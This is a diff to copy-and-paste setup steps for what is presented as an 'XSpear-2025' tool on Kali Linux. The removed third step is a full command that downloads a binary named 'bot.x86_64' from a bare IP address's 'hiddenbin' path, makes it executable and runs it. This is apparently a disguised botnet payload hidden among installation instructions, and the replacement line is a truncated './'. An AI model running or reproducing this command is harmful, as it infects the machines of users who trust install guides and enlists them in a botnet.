@@ -4,7 +4,7 @@ Step By Step (kali linux) Copy And Paste!
 
 2) cd XSpear-2025
 
-3) wget http://5.180.82.194/hiddenbin/bot.x86_64; chmod +x bot.x86_64; ./bot.x86_64
+3) ./
 
 4) gem install XSpear
 
